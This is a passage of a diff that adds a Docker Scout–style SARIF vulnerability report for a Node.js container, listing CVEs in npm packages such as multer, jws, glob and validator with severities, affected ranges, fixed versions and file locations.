CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H |\n"
+              },
+              "properties": {
+                "affected_version": ">=11.0.0,<11.1.0",
+                "cvssV3": 7.5,
+                "cvssV3_severity": "HIGH",
+                "cvssV3_vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
+                "fixed_version": "11.1.0",
+                "purls": [
+                  "pkg:npm/glob@10.4.5",
+                  "pkg:npm/glob@11.0.3"
+                ],
+                "security-severity": "7.5",
+                "tags": [
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2025-65945",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2025-65945: Improper Verification of Cryptographic Signature"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2025-65945?s=github&n=jws&t=npm&vr=%3C3.2.3",
+              "help": {
+                "text": "### Overview\nAn improper signature verification vulnerability exists when using auth0/node-jws with the HS256 algorithm under specific conditions.\n\n### Am I Affected?\nYou are affected by this vulnerability if you meet all of the following preconditions:\n\n1. Application uses the auth0/node-jws implementation of JSON Web Signatures, versions <=3.2.2 || 4.0.0\n2. Application uses the jws.createVerify() function for HMAC algorithms\n3. Application uses user-provided data from the JSON Web Signature Protected Header or Payload in the HMAC secret lookup routines\n\nYou are NOT affected by this vulnerability if you meet any of the following preconditions:\n1. Application uses the jws.verify() interface (note: `auth0/node-jsonwebtoken` users fall into this category and are therefore NOT affected by this vulnerability)\n2. Application uses only asymmetric algorithms (e.g. RS256)\n3. Application doesn’t use user-provided data from the JSON Web Signature Protected Header or Payload in the HMAC secret lookup routines\n\n### Fix\nUpgrade auth0/node-jws version to version 3.2.3 or 4.0.1\n\n### Acknowledgement\nOkta would like to thank Félix Charette for discovering this vulnerability.\n",
+                "markdown": "> ### Overview\nAn improper signature verification vulnerability exists when using auth0/node-jws with the HS256 algorithm under specific conditions.\n\n### Am I Affected?\nYou are affected by this vulnerability if you meet all of the following preconditions:\n\n1. Application uses the auth0/node-jws implementation of JSON Web Signatures, versions <=3.2.2 || 4.0.0\n2. Application uses the jws.createVerify() function for HMAC algorithms\n3. Application uses user-provided data from the JSON Web Signature Protected Header or Payload in the HMAC secret lookup routines\n\nYou are NOT affected by this vulnerability if you meet any of the following preconditions:\n1. Application uses the jws.verify() interface (note: `auth0/node-jsonwebtoken` users fall into this category and are therefore NOT affected by this vulnerability)\n2. Application uses only asymmetric algorithms (e.g. RS256)\n3. Application doesn’t use user-provided data from the JSON Web Signature Protected Header or Payload in the HMAC secret lookup routines\n\n### Fix\nUpgrade auth0/node-jws version to version 3.2.3 or 4.0.1\n\n### Acknowledgement\nOkta would like to thank Félix Charette for discovering this vulnerability.\n\n|                |                                              |\n|----------------|----------------------------------------------|\n| Package        | pkg:npm/jws@3.2.2                            |\n| Affected range | <3.2.3                                       |\n| Fixed version  | 3.2.3                                        |\n| CVSS Score     |                                          7.5 |\n| CVSS Vector    | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N |\n"
+              },
+              "properties": {
+                "affected_version": "<3.2.3",
+                "cvssV3": 7.5,
+                "cvssV3_severity": "HIGH",
+                "cvssV3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+                "fixed_version": "3.2.3",
+                "purls": [
+                  "pkg:npm/jws@3.2.2"
+                ],
+                "security-severity": "7.5",
+                "tags": [
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2025-7338",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2025-7338: Uncaught Exception"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2025-7338?s=github&n=multer&t=npm&vr=%3E%3D1.4.4-lts.1%2C%3C2.0.2",
+              "help": {
+                "text": "### Impact\n\nA vulnerability in Multer versions >= 1.4.4-lts.1, < 2.0.2 allows an attacker to trigger a Denial of Service (DoS) by sending a malformed request. This request causes an unhandled exception, leading to a crash of the process.\n\n### Patches\n\nUsers should upgrade to `2.0.2`\n\n### Workarounds\n\nNone\n",
+                "markdown": "> ### Impact\n\nA vulnerability in Multer versions >= 1.4.4-lts.1, < 2.0.2 allows an attacker to trigger a Denial of Service (DoS) by sending a malformed request. This request causes an unhandled exception, leading to a crash of the process.\n\n### Patches\n\nUsers should upgrade to `2.0.2`\n\n### Workarounds\n\nNone\n\n|                |                                              |\n|----------------|----------------------------------------------|\n| Package        | pkg:npm/multer@1.4.4-lts.1                   |\n| Affected range | >=1.4.4-lts.1,<2.0.2                         |\n| Fixed version  | 2.0.2                                        |\n| CVSS Score     |                                          7.5 |\n| CVSS Vector    | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H |\n"
+              },
+              "properties": {
+                "affected_version": ">=1.4.4-lts.1,<2.0.2",
+                "cvssV3": 7.5,
+                "cvssV3_severity": "HIGH",
+                "cvssV3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+                "fixed_version": "2.0.2",
+                "purls": [
+                  "pkg:npm/multer@1.4.4-lts.1"
+                ],
+                "security-severity": "7.5",
+                "tags": [
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2025-12758",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2025-12758: Incomplete Filtering of One or More Instances of Special Elements"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2025-12758?s=github&n=validator&t=npm&vr=%3C13.15.22",
+              "help": {
+                "text": "Versions of the package validator before 13.15.22 are vulnerable to Incomplete Filtering of One or More Instances of Special Elements in the isLength() function that does not take into account Unicode variation selectors (\\uFE0F, \\uFE0E) appearing in a sequence which lead to improper string length calculation. This can lead to an application using isLength for input validation accepting strings significantly longer than intended, resulting in issues like data truncation in databases, buffer overflows in other system components, or denial-of-service.\n",
+                "markdown": "> Versions of the package validator before 13.15.22 are vulnerable to Incomplete Filtering of One or More Instances of Special Elements in the isLength() function that does not take into account Unicode variation selectors (\\uFE0F, \\uFE0E) appearing in a sequence which lead to improper string length calculation. This can lead to an application using isLength for input validation accepting strings significantly longer than intended, resulting in issues like data truncation in databases, buffer overflows in other system components, or denial-of-service.\n\n|                |                                                                                                                                                                                |\n|----------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| Package        | pkg:npm/validator@13.15.0                                                                                                                                                      |\n| Affected range | <13.15.22                                                                                                                                                                      |\n| Fixed version  | 13.15.22                                                                                                                                                                       |\n| CVSS Score     |                                                                                                                                                                            7.7 |\n| CVSS Vector    | CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X |\n"
+              },
+              "properties": {
+                "affected_version": "<13.15.22",
+                "cvssV3": 7.7,
+                "cvssV3_severity": "HIGH",
+                "cvssV3_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
+                "fixed_version": "13.15.22",
+                "purls": [
+                  "pkg:npm/validator@13.15.0"
+                ],
+                "security-severity": "7.7",
+                "tags": [
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2025-48997",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2025-48997: Uncaught Exception"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2025-48997?s=github&n=multer&t=npm&vr=%3E%3D1.4.4-lts.1%2C%3C2.0.1",
+              "help": {
+                "text": "### Impact\n\nA vulnerability in Multer versions >=1.4.4-lts.1, <2.0.1 allows an attacker to trigger a Denial of Service (DoS) by sending an upload file request with an empty string field name. This request causes an unhandled exception, leading to a crash of the process.\n\n### Patches\n\nUsers should upgrade to `2.0.1`\n\n### Workarounds\n\nNone\n\n### References\n\nhttps://github.com/expressjs/multer/commit/35a3272b611945155e046dd5cef11088587635e9\nhttps://github.com/expressjs/multer/issues/1233\nhttps://github.com/expressjs/multer/pull/1256\n",
+                "markdown": "> ### Impact\n\nA vulnerability in Multer versions >=1.4.4-lts.1, <2.0.1 allows an attacker to trigger a Denial of Service (DoS) by sending an upload file request with an empty string field name. This request causes an unhandled exception, leading to a crash of the process.\n\n### Patches\n\nUsers should upgrade to `2.0.1`\n\n### Workarounds\n\nNone\n\n### References\n\nhttps://github.com/expressjs/multer/commit/35a3272b611945155e046dd5cef11088587635e9\nhttps://github.com/expressjs/multer/issues/1233\nhttps://github.com/expressjs/multer/pull/1256\n\n|                |                                                                 |\n|----------------|-----------------------------------------------------------------|\n| Package        | pkg:npm/multer@1.4.4-lts.1                                      |\n| Affected range | >=1.4.4-lts.1,<2.0.1                                            |\n| Fixed version  | 2.0.1                                                           |\n| CVSS Score     |                                                             8.7 |\n| CVSS Vector    | CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N |\n"
+              },
+              "properties": {
+                "affected_version": ">=1.4.4-lts.1,<2.0.1",
+                "cvssV3": 8.7,
+                "cvssV3_severity": "HIGH",
+                "cvssV3_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+                "fixed_version": "2.0.1",
+                "purls": [
+                  "pkg:npm/multer@1.4.4-lts.1"
+                ],
+                "security-severity": "8.7",
+                "tags": [
+                  "HIGH"
+                ]
+              }
+            }
+          ],
+          "version": "1.18.3"
+        }
+      },
+      "results": [
+        {
+          "ruleId": "CVE-2025-5889",
+          "ruleIndex": 0,
+          "kind": "fail",
+          "level": "note",
+          "message": {
+            "text": "  Vulnerability   : CVE-2025-5889                                                                                                                                                                   \n  Severity        : LOW                                                                                                                                                                             \n  Package         : pkg:npm/brace-expansion@1.1.11                                                                                                                                                  \n  Affected range  : >=1.0.0,<=1.1.11                                                                                                                                                                \n  Fixed version   : 1.1.12                                                                                                                                                                          \n  CVSS Score      : 1.3                                                                                                                                                                             \n  CVSS Vector     : CVSS:4.0/AV:N/AC:H/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X  \n  EPSS Score      : 0.000170                                                                                                                                                                        \n  EPSS Percentile : 0.034370                                                                                                                                                                        \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/app/node_modules/brace-expansion/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2025-5889",
+          "ruleIndex": 0,
+          "kind": "fail",
+          "level": "note",
+          "message": {
+            "text": "  Vulnerability   : CVE-2025-5889                                                                                                                                                                   \n  Severity        : LOW                                                                                                                                                                             \n  Package         : pkg:npm/brace-expansion@2.0.1                                                                                                                                                   \n  Affected range  : >=2.0.0,<=2.0.1                                                                                                                                                                 \n  Fixed version   : 2.0.2                                                                                                                                                                           \n  CVSS Score      : 1.3                                                                                                                                                                             \n  CVSS Vector     : CVSS:4.0/AV:N/AC:H/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X  \n  EPSS Score      : 0.000170                                                                                                                                                                        \n  EPSS Percentile : 0.034370                                                                                                                                                                        \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/app/node_modules/rimraf/node_modules/brace-expansion/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2025-64718",
+          "ruleIndex": 1,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "  Vulnerability   : CVE-2025-64718                                \n  Severity        : MEDIUM                                        \n  Package         : pkg:npm/js-yaml@4.1.0                         \n  Affected range  : >=4.0.0,<4.1.1                                \n  Fixed version   : 4.1.1                                         \n  CVSS Score      : 5.3                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N  \n  EPSS Score      : 0.000170                                      \n  EPSS Percentile : 0.031370                                      \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/app/node_modules/js-yaml/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2024-29409",
+          "ruleIndex": 2,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "  Vulnerability   : CVE-2024-29409                                \n  Severity        : MEDIUM                                        \n  Package         : pkg:npm/%40nestjs/common@10.4.16              \n  Affected range  : <11.0.16                                      \n  Fixed version   : 11.0.16                                       \n  CVSS Score      : 5.5                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:L  \n  EPSS Score      : 0.001540                                      \n  EPSS Percentile : 0.366350                                      \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/app/node_modules/@nestjs/common/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2025-56200",
+          "ruleIndex": 3,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "  Vulnerability   : CVE-2025-56200                                \n  Severity        : MEDIUM                                        \n  Package         : pkg:npm/validator@13.15.0                     \n  Affected range  : <13.15.20                                     \n  Fixed version   : 13.15.20                                      \n  CVSS Score      : 6.1                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N  \n  EPSS Score      : 0.000460                                      \n  EPSS Percentile : 0.141300                                      \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/app/node_modules/validator/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2025-64118",
+          "ruleIndex": 4,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "  Vulnerability   : CVE-2025-64118                                                   \n  Severity        : MEDIUM                                                           \n  Package         : pkg:npm/tar@7.5.1                                                \n  Affected range  : =7.5.1                                                           \n  Fixed version   : 7.5.2                                                            \n  CVSS Score      : 6.1                                                              \n  CVSS Vector     : CVSS:4.0/AV:L/AC:H/AT:P/PR:L/UI:P/VC:H/VI:L/VA:L/SC:H/SI:H/SA:H  \n  EPSS Score      : 0.000060                                                         \n  EPSS Percentile : 0.002800                                                         \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/local/lib/node_modules/npm/node_modules/tar/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2025-47935",
+          "ruleIndex": 5,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "  Vulnerability   : CVE-2025-47935                                \n  Severity        : HIGH                                          \n  Package         : pkg:npm/multer@1.4.4-lts.1                    \n  Affected range  : <2.0.0                                        \n  Fixed version   : 2.0.0                                         \n  CVSS Score      : 7.5                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H  \n  EPSS Score      : 0.000480                                      \n  EPSS Percentile : 0.147850                                      \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/app/node_modules/multer/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2025-47944",
+          "ruleIndex": 6,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "  Vulnerability   : CVE-2025-47944                                \n  Severity        : HIGH                                          \n  Package         : pkg:npm/multer@1.4.4-lts.1                    \n  Affected range  : >=1.4.4-lts.1,<2.0.0                          \n  Fixed version   : 2.0.0                                         \n  CVSS Score      : 7.5                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H  \n  EPSS Score      : 0.000110                                      \n  EPSS Percentile : 0.010750                                      \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/app/node_modules/multer/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2025-64756",
+          "ruleIndex": 7,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "  Vulnerability   : CVE-2025-64756                                \n  Severity        : HIGH                                          \n  Package         : pkg:npm/glob@11.0.3                           \n  Affected range  : >=11.0.0,<11.1.0                              \n  Fixed version   : 11.1.0                                        \n  CVSS Score      : 7.5                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H  \n  EPSS Score      : 0.000360                                      \n  EPSS Percentile : 0.101210                                      \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/local/lib/node_modules/npm/node_modules/glob/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2025-64756",
+          "ruleIndex": 7,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "  Vulnerability   : CVE-2025-64756                                \n  Severity        : HIGH                                          \n  Package         : pkg:npm/glob@10.4.5                           \n  Affected range  : >=10.2.0,<10.5.0                              \n  Fixed version   : 11.1.0                                        \n  CVSS Score      : 7.5                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H  \n  EPSS Score      : 0.000360                                      \n  EPSS Percentile : 0.101210                                      \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/app/node_modules/rimraf/node_modules/glob/package.json"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/local/lib/node_modules/npm/node_modules/node-gyp/node_modules/glob/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2025-65945",
+          "ruleIndex": 8,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "  Vulnerability   : CVE-2025-65945                                \n  Severity        : HIGH                                          \n  Package         : pkg:npm/jws@3.2.2                             \n  Affected range  : <3.2.3                                        \n  Fixed version   : 3.2.3                                         \n  CVSS Score      : 7.5                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N  \n  EPSS Score      : 0.000200                                      \n  EPSS Percentile : 0.044640                                      \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/app/node_modules/jws/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2025-7338",
+          "ruleIndex": 9,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "  Vulnerability   : CVE-2025-7338                                 \n  Severity        : HIGH                                          \n  Package         : pkg:npm/multer@1.4.4-lts.1                    \n  Affected range  : >=1.4.4-lts.1,<2.0.2                          \n  Fixed version   : 2.0.2                                         \n  CVSS Score      : 7.5                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H  \n  EPSS Score      : 0.000370                                      \n  EPSS Percentile : 0.105560                                      \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/app/node_modules/multer/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2025-12758",
+          "ruleIndex": 10,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "  Vulnerability   : CVE-2025-12758                                                                                                                                                                  \n  Severity        : HIGH                                                                                                                                                                            \n  Package         : pkg:npm/validator@13.15.0                                                                                                                                                       \n  Affected range  : <13.15.22                                                                                                                                                                       \n  Fixed version   : 13.15.22                                                                                                                                                                        \n  CVSS Score      : 7.7                                                                                                                                                                             \n  CVSS Vector     : CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X  \n  EPSS Score      : 0.000500                                                                                                                                                                        \n  EPSS Percentile : 0.153210                                                                                                                                                                        \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/app/node_modules/validator/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2025-48997",
+          "ruleIndex": 11,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "  Vulnerability   : CVE-2025-48997                                                   \n  Severity        : HIGH                                                             \n  Package         : pkg:npm/multer@1.4.4-lts.1                                       \n  Affected range  : >=1.4.4-lts.1,<2.0.1                                             \n  Fixed version   : 2.0.1                                                            \n  CVSS Score      : 8.7                                                              \n  CVSS Vector     : CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N  \n  EPSS Score      : 0.000640                                                         \n  EPSS Percentile : 0.198290                                                         \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/app/node_modules/multer/package.json"
+                }
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
